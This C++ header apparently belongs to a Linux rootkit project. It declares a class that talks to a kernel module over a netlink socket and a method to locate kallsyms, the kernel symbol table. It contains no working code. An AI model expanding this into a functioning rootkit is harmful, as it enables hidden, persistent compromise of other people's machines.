//
// Created by idan on 1/7/24.
//

#ifndef ROOTKIT_KERNEL_ACCESS_H
#define ROOTKIT_KERNEL_ACCESS_H

#include <linux/netlink.h>
#include <string>

#include "msg_to_module.h"
#include "msg_to_user.h"

class kernel_access {
private:
    int sock_fd;
    struct sockaddr_nl dest_addr;

    unsigned long find_kallsyms();

public:
    msg_to_user my_recv_msg();
    void my_send_msg(msg_to_module);

    kernel_access();
    virtual ~kernel_access();

};


#endif //ROOTKIT_KERNEL_ACCESS_H
